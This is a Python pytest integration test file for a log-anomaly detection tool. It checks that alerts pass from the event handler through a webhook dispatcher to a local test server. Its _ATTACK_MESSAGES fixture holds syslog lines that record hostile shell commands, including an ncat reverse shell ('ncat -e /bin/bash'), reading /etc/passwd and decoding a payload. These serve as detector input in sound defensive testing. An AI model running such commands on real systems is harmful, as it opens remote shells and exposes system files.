"""Integration tests for AlertDispatcher wired into the pipeline handler.

Tests the full path: RawEvent → handler → write_alert → enqueue → dispatcher → HTTP POST.
Uses aiohttp.test_utils.TestServer as a local webhook endpoint so the real
aiohttp.ClientSession.post() path is exercised without external network calls.
"""

from __future__ import annotations

import asyncio
import time
import uuid
from typing import TYPE_CHECKING
from unittest.mock import patch

import aiohttp
import pytest
from aiohttp import web
from aiohttp.test_utils import TestServer

from seerflow.alerting.dispatcher import AlertDispatcher, WebhookTarget
from seerflow.config import SeerflowConfig, StorageConfig
from seerflow.detection.ensemble import DetectionEnsemble, DetectionResult
from seerflow.models.alert import Alert
from seerflow.models.event import SeverityLevel
from seerflow.pipeline.handler import make_handler
from seerflow.receivers.base import RawEvent
from seerflow.storage.sqlite import SqliteBackend

if TYPE_CHECKING:
    from collections.abc import AsyncIterator
    from pathlib import Path

pytestmark = pytest.mark.e2e


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _raw(message: str, source_type: str = "syslog") -> RawEvent:
    """Build a RawEvent from a log message (mirrors test_e2e_pipeline)."""
    return RawEvent(
        data=message.encode(),
        source_type=source_type,
        source_id=f"{source_type}-test",
        received_ns=time.time_ns(),
        metadata={},
    )


def _make_alert(
    *,
    severity_id: SeverityLevel = SeverityLevel.CRITICAL,
    rule_name: str = "test-rule",
) -> Alert:
    """Build a fully-populated Alert for direct dispatcher enqueue tests."""
    return Alert(
        alert_id=str(uuid.uuid4()),
        alert_type="ml",
        timestamp_ns=time.time_ns(),
        severity_id=severity_id,
        rule_name=rule_name,
        description="Integration test alert",
        entity_uuid=str(uuid.uuid4()),
        entity_value="10.0.0.1",
        entity_type="ip",
        contributing_events=(uuid.uuid4(),),
        risk_score=0.8,
        dedup_key=f"test:{rule_name}",
    )


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture()
async def webhook_server() -> AsyncIterator[tuple[str, list[dict[str, object]]]]:
    """Start a local aiohttp TestServer that records POST payloads."""
    received: list[dict[str, object]] = []

    async def _handler(request: web.Request) -> web.Response:
        body = await request.json()
        received.append(body)
        return web.json_response({"ok": True})

    app = web.Application()
    app.router.add_post("/webhook", _handler)
    server = TestServer(app)
    await server.start_server()
    url = f"http://{server.host}:{server.port}/webhook"
    try:
        yield url, received
    finally:
        await server.close()


@pytest.fixture()
async def storage(tmp_path: Path) -> AsyncIterator[SqliteBackend]:
    """Create a real SqliteBackend in a tmp path for integration tests."""
    cfg = StorageConfig(backend="sqlite", sqlite_path=str(tmp_path / "webhook.db"))
    backend = await SqliteBackend.connect(cfg)
    try:
        yield backend
    finally:
        await backend.close()


# ---------------------------------------------------------------------------
# Test messages (mirror test_e2e_pipeline for consistency)
# ---------------------------------------------------------------------------


_ATTACK_MESSAGES = [
    "<134>1 2026-03-28T11:00:00Z server1 bash 1001 - - bash -c whoami",
    "<134>1 2026-03-28T11:00:01Z server1 sshd 1002 - - "
    "Failed password for root from 10.0.0.1 port 22 ssh2",
    "<134>1 2026-03-28T11:00:02Z server1 bash 1003 - - cat /etc/passwd",
    "<134>1 2026-03-28T11:00:03Z server1 bash 1004 - - base64 -d /tmp/payload",
    "<134>1 2026-03-28T11:00:04Z server1 bash 1005 - - ncat -e /bin/bash 10.0.0.2 4444",
]


# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------


# Sentinel severity above every real SeverityLevel. Referencing the live
# enum ceiling keeps the filter boundary self-documenting and regression-proof
# if the enum ever gains a higher value.
_IMPOSSIBLY_HIGH_SEVERITY = int(SeverityLevel.FATAL) + 1


def _forced_anomaly() -> DetectionResult:
    """Return a fresh DetectionResult stubbing an anomaly hit.

    Returned per-call (instead of a shared module-level constant) so that
    any accidental mutation in one test cannot bleed into another — aligns
    with the project's immutability convention for shared test data.
    """
    return DetectionResult(
        score=0.92,
        upper_threshold=0.65,
        lower_threshold=0.10,
        is_anomaly=True,
        anomaly_direction="upper",
        source_type="syslog",
    )


class TestWebhookPipeline:
    """Integration tests for handler → dispatcher → HTTP POST flow."""

    async def test_handler_enqueues_alert_to_dispatcher(
        self,
        webhook_server: tuple[str, list[dict[str, object]]],
        storage: SqliteBackend,
    ) -> None:
        """Full path: events → handler → write_alert → enqueue → POST to server.

        Uses a forced anomaly DetectionResult (mirrors test_alert_persistence.py)
        to remove dependency on ML warmup/scoring drift; the goal here is to
        verify the *wiring*, not the detector itself.
        """
        url, received = webhook_server
        target = WebhookTarget(name="webhook-0", url=url, format="json", min_severity=0)

        async with aiohttp.ClientSession() as session:
            dispatcher = AlertDispatcher(targets=(target,), session=session)
            task = asyncio.create_task(dispatcher.run())

            config = SeerflowConfig()
            ensemble = DetectionEnsemble(config.detection)
            handler = make_handler(
                ensemble,
                storage,
                save_interval_ns=999_999_999_999,
                alert_dispatcher=dispatcher,
            )

            with patch.object(type(ensemble), "process_event", return_value=_forced_anomaly()):
                for msg in _ATTACK_MESSAGES:
                    await handler(_raw(msg))

            await dispatcher.stop()
            await asyncio.wait_for(task, timeout=5.0)

        # dispatcher.run() drains the queue before exit — the wait_for above
        # guarantees every enqueued alert has been POSTed by the time we reach
        # this assertion, so no time-based sleep is needed.
        assert len(received) > 0, "Expected at least one webhook POST after forced anomaly events"
        payload = received[0]
        assert "alert_id" in payload
        assert "severity" in payload
        assert "rule_name" in payload
        assert "timestamp" in payload
        assert payload["rule_name"] == "hst-anomaly"

    async def test_severity_filter_skips_low_severity(
        self,
        webhook_server: tuple[str, list[dict[str, object]]],
        storage: SqliteBackend,
    ) -> None:
        """Target with min_severity=99 receives no alerts from forced anomalies.

        `_IMPOSSIBLY_HIGH_SEVERITY` is one above the live enum ceiling
        (`SeverityLevel.FATAL`), so every alert produced must be filtered
        out by `AlertDispatcher._dispatch`.
        """
        url, received = webhook_server
        target = WebhookTarget(
            name="webhook-high-only",
            url=url,
            format="json",
            min_severity=_IMPOSSIBLY_HIGH_SEVERITY,
        )

        async with aiohttp.ClientSession() as session:
            dispatcher = AlertDispatcher(targets=(target,), session=session)
            task = asyncio.create_task(dispatcher.run())

            config = SeerflowConfig()
            ensemble = DetectionEnsemble(config.detection)
            handler = make_handler(
                ensemble,
                storage,
                save_interval_ns=999_999_999_999,
                alert_dispatcher=dispatcher,
            )

            with patch.object(type(ensemble), "process_event", return_value=_forced_anomaly()):
                for msg in _ATTACK_MESSAGES:
                    await handler(_raw(msg))

            await dispatcher.stop()
            await asyncio.wait_for(task, timeout=5.0)

        assert len(received) == 0, (
            f"Expected 0 POSTs with min_severity={_IMPOSSIBLY_HIGH_SEVERITY}, got {len(received)}"
        )

    async def test_dispatcher_lifecycle_drain(
        self,
        webhook_server: tuple[str, list[dict[str, object]]],
    ) -> None:
        """Dispatcher drains all enqueued alerts before the consumer task exits.

        Verifies shutdown ordering: ``stop()`` flips the running flag, but
        ``run()`` must continue pulling from the queue until it is empty so no
        alert is dropped on shutdown.
        """
        url, received = webhook_server
        target = WebhookTarget(name="webhook-drain", url=url, format="json", min_severity=0)

        async with aiohttp.ClientSession() as session:
            dispatcher = AlertDispatcher(targets=(target,), session=session)
            task = asyncio.create_task(dispatcher.run())

            # Enqueue 5 alerts directly (bypass handler).
            for i in range(5):
                dispatcher.enqueue(_make_alert(rule_name=f"rule-{i}"))

            # Stop and wait for drain.
            await dispatcher.stop()
            await asyncio.wait_for(task, timeout=5.0)

        assert len(received) == 5, f"Expected 5 POSTs after drain, got {len(received)}"
        # Verify each payload is distinct.
        rule_names = {p["rule_name"] for p in received}
        assert rule_names == {f"rule-{i}" for i in range(5)}
